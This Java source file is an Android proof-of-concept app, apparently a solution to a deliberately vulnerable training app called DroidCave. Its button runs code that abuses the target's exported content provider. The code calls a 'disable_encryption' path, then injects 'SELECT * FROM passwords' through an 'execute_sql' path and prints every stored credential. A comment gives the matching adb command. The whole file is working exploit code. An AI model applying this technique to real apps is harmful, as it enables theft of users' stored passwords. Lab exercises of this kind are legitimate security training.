package com.nasr.droidcavepoc;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.nio.charset.StandardCharsets;

public class MainActivity extends AppCompatActivity {

    private TextView tvResult;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvResult = findViewById(R.id.tv_result);
        Button btnExploit = findViewById(R.id.btn_exploit);

        btnExploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                exploitDroidCave();
            }
        });
    }

    private void exploitDroidCave() {
        ContentResolver resolver = getContentResolver();
        StringBuilder output = new StringBuilder();

        // 1. Disable encryption
        Uri disableUri = Uri.parse("content://com.eightksec.droidcave.provider/disable_encryption");
        try {
            Cursor disableCursor = resolver.query(disableUri, null, null, null, null);
            if (disableCursor != null) {
                if (disableCursor.moveToFirst()) {
                    String message = disableCursor.getString(0);
                    output.append("Result After Decryption: ").append(message).append("\n\n");
                }
                disableCursor.close();
            }
        } catch (SecurityException e) {
            output.append("Decryption Failed: ").append(e.getMessage()).append("\n\n");
        }

        // 2. Read all passwords using execute_sql (with Uri.Builder)
        // adb shell content query --uri "content://com.eightksec.droidcave.provider/execute_sql/select%20*%20from%20passwords"
        try {
            // Build URI using Uri.Builder to automatically encode the path
            Uri sqlUri = new Uri.Builder()
                    .scheme("content")
                    .authority("com.eightksec.droidcave.provider")
                    .appendPath("execute_sql")
                    .appendPath("SELECT * FROM passwords")  // will be encoded automatically
                    .build();

            output.append("URI used: ").append(sqlUri.toString()).append("\n\n");

            Cursor cursor = resolver.query(sqlUri, null, null, null, null);
            if (cursor != null) {
                int count = cursor.getCount();
                output.append("Found ").append(count).append(" password(s):\n\n");

                // Get column names
                String[] columnNames = cursor.getColumnNames();
                output.append("Columns: ").append(java.util.Arrays.toString(columnNames)).append("\n\n");

                while (cursor.moveToNext()) {
                    for (String col : columnNames) {
                        int columnIndex = cursor.getColumnIndex(col);
                        int type = cursor.getType(columnIndex);
                        if (type == Cursor.FIELD_TYPE_BLOB) {
                            byte[] blob = cursor.getBlob(columnIndex);
                            // Convert BLOB to string (after decryption it's plain text)
                            String text = new String(blob, StandardCharsets.UTF_8);
                            output.append(col).append(": ").append(text).append("\n");
                        } else if (type == Cursor.FIELD_TYPE_STRING) {
                            output.append(col).append(": ").append(cursor.getString(columnIndex)).append("\n");
                        } else if (type == Cursor.FIELD_TYPE_INTEGER) {
                            output.append(col).append(": ").append(cursor.getInt(columnIndex)).append("\n");
                        } else if (type == Cursor.FIELD_TYPE_FLOAT) {
                            output.append(col).append(": ").append(cursor.getFloat(columnIndex)).append("\n");
                        } else {
                            output.append(col).append(": (other type)\n");
                        }
                    }
                    output.append("------------------------\n");
                }
                cursor.close();
            } else {
                output.append("Query failed: cursor = null\n");
            }
        } catch (SecurityException e) {
            output.append("Security error: ").append(e.getMessage()).append("\n");
        } catch (Exception e) {
            output.append("Unexpected exception: ").append(e.toString()).append("\n");
        }

        // Display result
        tvResult.setText(output.toString());
        Toast.makeText(this, "Exploit completed!", Toast.LENGTH_LONG).show();
    }
}